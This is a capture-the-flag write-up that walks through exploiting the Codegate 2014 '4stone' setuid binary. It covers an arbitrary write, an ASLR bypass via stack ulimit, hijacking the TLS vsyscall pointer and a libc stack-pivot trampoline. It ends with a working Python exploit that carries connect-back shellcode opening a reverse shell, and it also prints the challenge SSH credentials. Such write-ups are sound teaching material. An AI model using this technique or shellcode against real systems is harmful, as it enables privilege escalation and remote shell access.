4stone Write-up
===============

The Codegate 2014 Qualifiers happened this past weekend. Codegate Quals is generally a good time (although it can be quite frustrating), so several Marauders and I decided we'd play. The competition was 30 hours long, which is nice as it doesn't dominate an entire weekend. It started at 7am local time (EST) on Saturday and finished at 1pm on Sunday.

![Codegate Scoreboard](https://github.com/maraud3rs/writeups/blob/master/codegate_4stone/scoreboard.png)

I'm normally quite vocally negative about challenges that don't have deterministic solutions. In the past, Codegate Quals has required brute-forcing stack-bases or leaking out libc through information disclosures. However, I'm happy to report that I was able to craft a deterministic 4stone exploit (after initially thinking it wasn't possible). 

4stone Overview
---------------

4stone was labeled as a 300point pwnable. By the time I started, two teams had already solved it -- so I was expecting it to be pretty straight-forward. The challenge description was quite lacking, providing only ssh credentials.

    ssh guest@58.229.183.15 / ExtremelyDangerousGuest
    ssh guest@58.229.183.14 / ExtremelyDangerousGuest

The 4stone binary was hosted locally in the /home/4stone directory. 

    $ ls -al /home/4stone/
    total 36
    drwxr-xr-x 2 4stone 4stone 4096  2월 20 05:02 .
    drwxr-xr-x 7 root   root   4096  2월 23 08:18 ..
    -rwsr-xr-x 1 4stone 4stone 9764  2월 20 19:27 4stone
    lrwxrwxrwx 1 root   root      9  2월 19 21:14 .bash_history -> /dev/null
    -rw-r--r-- 1 4stone 4stone  220  3월 31  2013 .bash_logout
    -rw-r--r-- 1 4stone 4stone 3637  3월 31  2013 .bashrc
    -r-------- 1 4stone 4stone   27  2월 21 21:54 key
    -rw-r--r-- 1 4stone 4stone  675  3월 31  2013 .profile

As shown above, 4stone is marked with the setuid bit and the key is read-only by the 4stone user. This is a common setup in Codegate. The organizers expect us to find a vulnerability and develop an exploit in the 4stone binary that we can leverage from the "unprivileged" guest user. Then we'd use our elevated privileges to read the key file.

It's worth pointing out that folder permissions are not secure from an organizer perspective, as 4stone owns the directory. As the 4stone user (like you get after you pwn the binary), you could grief the game by deleting or modifying any files in this directory -- including the ones owned by root. The organizers actually mitigated this by mounting /home as read-only.

It's always worth doing a little reconnaissance on the target system. 

    $ id
    uid=1004(guest) gid=1004(guest) groups=1004(guest)
    $ lsb_release -a
    No LSB modules are available.
    Distributor ID:Ubuntu
    Description:Ubuntu 13.10
    Release:13.10
    Codename:saucy
    $ uname -a
    Linux notroottroot-virtual-machine 3.11.0-15-generic #25-Ubuntu SMP Thu Jan 30 17:25:07 UTC 2014 i686 i686 i686 GNU/Linux
    $ ls -l /home/
    total 20
    drwxr-xr-x 2 4stone     4stone     4096  2월 20 05:02 4stone
    drwxr-xr-x 2 guest      guest      4096  2월 20 05:05 guest
    drwxr-xr-x 2 hypercat   hypercat   4096  2월 19 21:14 hypercat
    drwxr-xr-x 2 membership membership 4096  2월 20 03:10 membership
    drwxr-xr-x 2 minibomb   minibomb   4096  2월 21 21:59 minibomb

It appears our guest account is a regular unprivileged account on an Ubuntu 13.10 32-bt x86 server. This server also hosts several other challenges. This server also isn't a standard US\_EN server install (and why would it be?) - the locale is set to ko\_KR.UTF-8.

4stone Binary
------------------

The 4stone binary is a dynamically-linked 32bit ELF executable - nothing special here.

    $ file 4stone
    4stone: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, from '%', stripped
    $ ldd 4stone
    	linux-gate.so.1 =>  (0xb77a3000)
    	libncurses.so.5 => /lib/i386-linux-gnu/libncurses.so.5 (0xb7768000)
    	libtinfo.so.5 => /lib/i386-linux-gnu/libtinfo.so.5 (0xb7746000)
    	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7591000)
    	libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb758c000)
    	/lib/ld-linux.so.2 (0xb77a4000)

The binary does rely on libncurses. That's potentially a little worrisome, as ncurses is quite foreign to me and can be quite difficult to script up interactions with it.

![4stone Main](https://github.com/maraud3rs/writeups/blob/master/codegate_4stone/main.png)

So, let's load it into IDA. 4stone is well-formed and IDA has no trouble disassembling it. After browsing around a bit, 4stone appears to be a ncurses-based game. When you beat it, the game prints "You win! Xx seconds" or "Your lose" depending on the return value of the game. The seconds it takes you are calculated from two gettimeofday() calls (one before the game and one after).

Side-Note: 4stone's main() sets up the frame pointer but then never uses it. This confuses IDA's stack analysis. To have IDA correctly identify stack-locals (so you can name them), you need to edit main's function attributes. You can do this by right-clicking on main at the top and selecting "Edit Function...".  

![Edit function](https://github.com/maraud3rs/writeups/blob/master/codegate_4stone/editfunction.png)
 
You'll want to uncheck "BP based frame". Now IDA correctly identifies all the stack locals. 

![4stone Main with locals](https://github.com/maraud3rs/writeups/blob/master/codegate_4stone/main2.png)

Isn't that better? :)

The actual game code isn't interesting. It appears to be a variant of Connect4 with more columns. I quickly launched the game to verify my suspicions.

![4stone game](https://github.com/maraud3rs/writeups/blob/master/codegate_4stone/game.png)

The interesting bit happens when you win.

The game isn't randomized at all, so the following keys will always win:
\n\nLL\nL\nH\nH\n. These can be put into a text file and fed in via STDIN to win in 0 seconds.

The Vulnerability
----------------------

![4stone win conditions](https://github.com/maraud3rs/writeups/blob/master/codegate_4stone/win.png)
 
The code above is pretty straight-forward. If you win with a 0-second time, it takes argv[1], converts it to an integer, casts it as a pointer, and writes there with the result of the scanf.

The C code is essentially this:

    unsigned int *where = (unsigned int *)strtoul(argv[1], NULL, 16);
    unsigned int what = 0;
    
    scanf("%x", &what);
    
    if (where) {
    	*where = what;
    }

Well....that's what I thought it was at first, as I ignored the comparisons in the middle. This is what it actually is:

    unsigned int *where = (unsigned int *)strtoul(argv[1], NULL, 16);
    unsigned int what = 0;
    
    scanf("%x", &what);
    
    if (where) {
    	if ((where >> 16) != 0x0804 && (where &  0xF0000000) != 0xB0000000) {
		    *where = what;
    	}
    }

Those extra checks prevent you from writing anywhere in 0x0804xxxx and 0xBxxxxxxx. So, what falls into those areas? Well, everywhere interesting to write!

    $ cat /proc/1585/maps
    08048000-0804a000 r-xp 00000000 ca:01 393837     /home/ubuntu/4stone
    0804a000-0804b000 r-xp 00001000 ca:01 393837     /home/ubuntu/4stone
    0804b000-0804c000 rwxp 00002000 ca:01 393837     /home/ubuntu/4stone
    09e14000-09e56000 rwxp 00000000 00:00 0          [heap]
    b7592000-b7593000 rwxp 00000000 00:00 0
    b7593000-b7596000 r-xp 00000000 ca:01 131845     /lib/i386-linux-gnu/tls/i686/nosegneg/libdl-2.17.so
    b7596000-b7597000 r-xp 00002000 ca:01 131845     /lib/i386-linux-gnu/tls/i686/nosegneg/libdl-2.17.so
    b7597000-b7598000 rwxp 00003000 ca:01 131845     /lib/i386-linux-gnu/tls/i686/nosegneg/libdl-2.17.so
    b7598000-b7599000 rwxp 00000000 00:00 0
    b7599000-b7747000 r-xp 00000000 ca:01 131842     /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
    b7747000-b7749000 r-xp 001ae000 ca:01 131842     /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
    b7749000-b774a000 rwxp 001b0000 ca:01 131842     /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
    b774a000-b774d000 rwxp 00000000 00:00 0
    b774d000-b776b000 r-xp 00000000 ca:01 131569     /lib/i386-linux-gnu/libtinfo.so.5.9
    b776b000-b776c000 ---p 0001e000 ca:01 131569     /lib/i386-linux-gnu/libtinfo.so.5.9
    b776c000-b776e000 r-xp 0001e000 ca:01 131569     /lib/i386-linux-gnu/libtinfo.so.5.9
    b776e000-b776f000 rwxp 00020000 ca:01 131569     /lib/i386-linux-gnu/libtinfo.so.5.9
    b776f000-b7792000 r-xp 00000000 ca:01 131526     /lib/i386-linux-gnu/libncurses.so.5.9
    b7792000-b7793000 r-xp 00022000 ca:01 131526     /lib/i386-linux-gnu/libncurses.so.5.9
    b7793000-b7794000 rwxp 00023000 ca:01 131526     /lib/i386-linux-gnu/libncurses.so.5.9
    b779a000-b779e000 rwxp 00000000 00:00 0
    b779e000-b779f000 r-xp 00000000 00:00 0          [vdso]
    b779f000-b77bf000 r-xp 00000000 ca:01 131489     /lib/i386-linux-gnu/ld-2.17.so
    b77bf000-b77c0000 r-xp 0001f000 ca:01 131489     /lib/i386-linux-gnu/ld-2.17.so
    b77c0000-b77c1000 rwxp 00020000 ca:01 131489     /lib/i386-linux-gnu/ld-2.17.so
    bf87e000-bf89f000 rwxp 00000000 00:00 0          [stack]

The only memory region outside of this space is the heap - which is rwx, but randomized.

You might be saying, "but there surely must be a bullshit trick that undermines all ASLR on setuid binaries?"...and you'd be right! If you using the bash built-in ulimit, you can modify the stack size of any subsequently launched binaries. By setting it to unlimited all the shared libraries and the vdso areas can't be randomized into the stack's area.

    $ ulimit -s unlimited
    $ cat /proc/1591/maps
    08048000-0804a000 r-xp 00000000 ca:01 393837     /home/ubuntu/4stone
    0804a000-0804b000 r-xp 00001000 ca:01 393837     /home/ubuntu/4stone
    0804b000-0804c000 rwxp 00002000 ca:01 393837     /home/ubuntu/4stone
    099d1000-09a13000 rwxp 00000000 00:00 0          [heap]
    40000000-40020000 r-xp 00000000 ca:01 131489     /lib/i386-linux-gnu/ld-2.17.so
    40020000-40021000 r-xp 0001f000 ca:01 131489     /lib/i386-linux-gnu/ld-2.17.so
    40021000-40022000 rwxp 00020000 ca:01 131489     /lib/i386-linux-gnu/ld-2.17.so
    40022000-40023000 r-xp 00000000 00:00 0          [vdso]
    40023000-40027000 rwxp 00000000 00:00 0
    4002d000-40050000 r-xp 00000000 ca:01 131526     /lib/i386-linux-gnu/libncurses.so.5.9
    40050000-40051000 r-xp 00022000 ca:01 131526     /lib/i386-linux-gnu/libncurses.so.5.9
    40051000-40052000 rwxp 00023000 ca:01 131526     /lib/i386-linux-gnu/libncurses.so.5.9
    40052000-40070000 r-xp 00000000 ca:01 131569     /lib/i386-linux-gnu/libtinfo.so.5.9
    40070000-40071000 ---p 0001e000 ca:01 131569     /lib/i386-linux-gnu/libtinfo.so.5.9
    40071000-40073000 r-xp 0001e000 ca:01 131569     /lib/i386-linux-gnu/libtinfo.so.5.9
    40073000-40074000 rwxp 00020000 ca:01 131569     /lib/i386-linux-gnu/libtinfo.so.5.9
    40074000-40222000 r-xp 00000000 ca:01 131842     /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
    40222000-40224000 r-xp 001ae000 ca:01 131842     /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
    40224000-40225000 rwxp 001b0000 ca:01 131842     /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
    40225000-40228000 rwxp 00000000 00:00 0
    40228000-4022b000 r-xp 00000000 ca:01 131845     /lib/i386-linux-gnu/tls/i686/nosegneg/libdl-2.17.so
    4022b000-4022c000 r-xp 00002000 ca:01 131845     /lib/i386-linux-gnu/tls/i686/nosegneg/libdl-2.17.so
    4022c000-4022d000 rwxp 00003000 ca:01 131845     /lib/i386-linux-gnu/tls/i686/nosegneg/libdl-2.17.so
    4022d000-4022e000 rwxp 00000000 00:00 0
    bfa82000-bfaa3000 rwxp 00000000 00:00 0          [stack]

Wow, what an awful feature! The only memory regions randomized now are the heap and the stack.

Exploitation
------------

So, where to overwrite? With a write-4 on Linux, you'd normally target the .got entry for the next libc call, but we can't do that here because the .got falls in the 0x0804xxxxx range. While we can't directly write to the .got, we can still abuse its use.

The only libc call after our write is to \_exit. 4stone doesn't have BIND\_NOW set, so the actual address still hasn't been resolved. The call to \_exit will be lazy bound and currently points to the dynamic linker's dynamic resolution functions (\_dl\_runtime\_resolve). It's up to the dynamic linker (ld.so) to resolve the address of exit and then jump there. I had a suspicion that there could be a nice juicy function pointer to overwrite somewhere in this process.

When diving down into the dynamic symbol resolution, I didn't find a lot of areas I could abuse. I expected to be able to overwrite a .got or .data pointer in ld.so, but was coming up short. The only indirect call or jump I could find was a call to gs:0x14. On 32-bit Linux, gs:0x14 is a pointer to the vdso \_\_kernel\_vsyscall() wrapper.

There's a problem with this approach though, the data structure pointed to by gs:0 is the thread local storage and is randomized...unless you set your stack limit to unlimited (it's really a broken feature). 

Since gdb is broken and awful and doesn't let you reference memory off any segment selector other than ds, we have to get clever to get the location of the tls block.

    (gdb) catch syscall set_thread_area
    Catchpoint 1 (syscall 'set_thread_area' [243])
    (gdb) run
    Starting program: /home/ubuntu/./4stone
    _______________________________________________________________________________
         eax:FFFFFFDA ebx:BFFFF060  ecx:40021000  edx:4022D6C0     eflags:00000206
         esi:00000001 edi:40026464  esp:BFFFF050  ebp:BFFFF198     eip:40000D31
         cs:0073  ds:007B  es:007B  fs:0000  gs:0000  ss:007B    o d I t s z a P c
    [007B:BFFFF050]---------------------------------------------------------[stack]
    BFFFF080 : 00 00 00 00  00 00 00 00 - 0F 00 00 00  00 00 00 00 ................
    BFFFF070 : 00 10 02 40  5C 15 02 40 - 64 64 02 40  CD 2F 00 40 ...@\..@dd.@./.@
    BFFFF060 : FF FF FF FF  C0 D6 22 40 - FF FF 0F 00  51 00 00 00 ......"@....Q...
    BFFFF050 : 08 02 00 00  01 00 00 00 - 00 00 00 00  00 00 00 00 ................
    [0073:40000D31]---------------------------------------------------------[ code]
    => 0x40000d31 <init_tls+329>:   xchg   ebx,ecx
       0x40000d33 <init_tls+331>:   test   eax,eax
       0x40000d35 <init_tls+333>:   jne    0x40000d4d <init_tls+357>
       0x40000d37 <init_tls+335>:   mov    eax,DWORD PTR [esp+0x10]
       0x40000d3b <init_tls+339>:   lea    eax,[eax*8+0x3]
       0x40000d42 <init_tls+346>:   mov    gs,eax
    ------------------------------------------------------------------------------
    
    Catchpoint 1 (call to syscall set_thread_area), 0x40000d31 in init_tls () at rtld.c:786
    786     rtld.c: No such file or directory.
    (gdb) finish
    Run till exit from #0  0x40000d80 in init_tls () at rtld.c:793
    _______________________________________________________________________________
         eax:4022D6C0 ebx:40021000  ecx:BFFFF060  edx:4022D6C0     eflags:00000282
         esi:4002155C edi:40026464  esp:BFFFF080  ebp:BFFFF198     eip:40002FCD
         cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a p c
    [007B:BFFFF080]---------------------------------------------------------[stack]
    BFFFF0B0 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
    BFFFF0A0 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
    BFFFF090 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
    BFFFF080 : 00 00 00 00  00 00 00 00 - 0F 00 00 00  00 00 00 00 ................
    [0073:40002FCD]---------------------------------------------------------[ code]
    => 0x40002fcd <dl_main+6317>:   mov    DWORD PTR [ebp-0x98],eax
       0x40002fd3 <dl_main+6323>:   mov    eax,DWORD PTR [ebx+0x89c]
       0x40002fd9 <dl_main+6329>:   test   eax,eax
       0x40002fdb <dl_main+6331>:   jne    0x40002fe2 <dl_main+6338>
       0x40002fdd <dl_main+6333>:   call   0x40000d84 <security_init>
       0x40002fe2 <dl_main+6338>:   mov    eax,DWORD PTR [ebp-0x90]
    ------------------------------------------------------------------------------
    0x40002fcd in dl_main (phdr=0x8048034, phnum=0x9, user_entry=0xbffff1ec, auxv=0xbffff2f0) at rtld.c:1819
    1819    in rtld.c
    Value returned is $1 = (void *) 0x4022d6c0
    (gdb)
The value (0x4022d6c0) in EAX is the static pointer to the TLS block. Note: this value was slightly different on the Codegate servers (I suspect because of locale considerations). 

    (gdb) x/40x $eax
    0x4022d6c0:     0x4022d6c0      0x4022db88      0x4022d6c0      0x00000000
    0x4022d6d0:     0x40022414      0x00000000      0x00000000      0x00000000
    (gdb) x/5i 0x40022414
       0x40022414 <__kernel_vsyscall>:      push   ecx
       0x40022415 <__kernel_vsyscall+1>:    push   edx
       0x40022416 <__kernel_vsyscall+2>:    push   ebp
       0x40022417 <__kernel_vsyscall+3>:    mov    ebp,esp
       0x40022419 <__kernel_vsyscall+5>:    sysenter
Excellent, now we know where to overwrite (0x4022d6d0 - the location of the pointer to kernel_vsyscall()). Overwriting that value gives us EIP control shortly after the call to _exit().

I crafted a file that I feed in via STDIN to cause the vulnerable condition:

    $ xxd 4stone2.txt
    0000000: 0a0a 6c6c 0a6c 0a68 0a68 0a0a 3635 3635  ..ll.l.h.h..6565
    0000010: 3635 3635 0a                             6565.
The 65656565 is read by scanf to be the "what" part of the write-4. Running this in gdb results in the following:

    (gdb) run 4022d6d0 < 4stone2.txt
    Program received signal SIGSEGV, Segmentation fault.
    ______________________________________________________________________________
         eax:000000FC ebx:00000000  ecx:402258C4  edx:65656565     eflags:00010296
         esi:00000000 edi:00000000  esp:BFFFF198  ebp:BFFFF1E8     eip:65656565
         cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z A P c
    [007B:BFFFF198]---------------------------------------------------------[stack]
    BFFFF1C8 : 2A 27 0A 53  F4 CA 09 00 - 2A 27 0A 53  86 E6 09 00 *'.S....*'.S....
    BFFFF1B8 : 65 65 65 65  D0 D6 22 40 - 00 00 00 00  02 00 00 00 eeee.."@........
    BFFFF1A8 : 10 00 00 00  C5 86 04 08 - E4 43 22 40  02 00 00 00 .........C"@....
    BFFFF198 : 14 EB 12 40  BA 98 04 08 - 00 00 00 00  B8 F1 FF BF ...@............
    [0073:65656565]---------------------------------------------------------[ code]
    => 0x65656565:  add    BYTE PTR [eax],al
       0x65656567:  add    BYTE PTR [eax],al
       0x65656569:  add    BYTE PTR [eax],al
       0x6565656b:  add    BYTE PTR [eax],al
       0x6565656d:  add    BYTE PTR [eax],al
       0x6565656f:  add    BYTE PTR [eax],al
    ------------------------------------------------------------------------------
    0x65656565 in ?? ()

Alright, now we have EIP control, where do we jump? If you remember from earlier, the stack and heap are RWX. However, there aren't many options to get data into them. 4stone enforces an argc of less than or equal to 2, so we can't pass them in on the command line, leaving environment variables as our only option.

It's at this point, that I got really frustrated because I thought I was going to have to spray a huge NOP sled and continuously jump blindly into the stack hoping for it to land...which is exactly what I did for a couple hours. I eventually gave up and started looking for other options.

In my naivety, I had overlooked that envp was around 0x100 bytes down the stack from the crashing  state.

    (gdb) x/20xw $esp+0x100
    0xbffff298:     0xbffff3f6      0xbffff401      0xbffff422      0xbffff435
    0xbffff2a8:     0xbffff441      0xbffff962      0xbffffe44      0xbffffe50
    0xbffff2b8:     0xbffffe66      0xbffffec4      0xbffffee5      0xbffffef4
    0xbffff2c8:     0xbfffff05      0xbfffff16      0xbfffff1f      0xbfffff27
    0xbffff2d8:     0xbfffff39      0xbfffff48      0xbfffff51      0xbfffff85
    (gdb) x/s 0xbffff3f6
    0xbffff3f6:     "SHELL=bash"

Rather than jumping blindly into the stack, if I could find a trampoline that added at least 0x100 to ESP before returning, I could return directly to an environment variable. I briefly looked in the 4stone binary itself for such a trampoline to no avail...but since libc was no longer randomized, I knew I'd be able to find a suitable trampoline there.

In the epilogue of the posix_fallocate64_l64(), I found a perfect trampoline:

    (gdb) x/8i 0x40156EBD
       0x40156ebd <__posix_fallocate64_l64+157>:    add    esp,0x10c
       0x40156ec3 <__posix_fallocate64_l64+163>:    ret

Alright, so now I just need to write the exploit. I grabbed some shellcode from shellstorm (connect back to port 11111 - I kept it at localhost because we had the guest shell). I made dozens of environment variables with my shellcode and threw my exploit (locally).

....and it crashed...

Looking closer, it died trying to execute the string "LOL=" as code. I quickly changed all my environment variables to start with \xeb\x02, which is the opcode for JMP $+4, which jumped over the remainder of the environment variable key and equals sign to my shellcode. Alright! It worked locally! Now to try it on their servers!

...and it crashed...

After doing some debugging, it turns out their version of 13.10 was slightly different than mine. After updating the pointers to the TLS block and the trampoline, the exploit worked and I got the flag.

Flag: gARBAG3_hOL3_R4bB1T_R5BBIT

My exploit code follows (this uses the pointer values for my EC2 instance's libc and tls block):

    #!/usr/bin/env python
    
    import os
    import sys
    import subprocess
    import collections
    
    sc = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a" +\
    "\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd" +\
    "\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01" +\
    "\x01\x66\x68\x2b\x67\x66\x6a\x02\x89\xe1" +\
    "\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b" +\
    "\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" +\
    "\x6e\x89\xe3\x31\xc9\xcd\x80"
    
    e = collections.OrderedDict()
    
    for i in xrange(ord('A'),ord('z')):
            e["\xeb\x02" + chr(i)] = sc
    
    # ncurses really wants TERM and a couple of the others, so copy them..
    for k, v in enumerate(os.environ):
            e[v] = os.environ[v]
    
    a = subprocess.Popen(["/home/4stone/4stone", "4022d6d0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=e)
    
    addr = 0x40156EBD
    
    win = '\n\nll\nl\nh\nh\n\n'
    win += "%08x\n" % (addr, )
    
    print repr(win)
    a.communicate(win)

Side Note: I used an OrderedDict because I was worried that my environment entries would get reordered. I'm not sure if it actually fixed anything.

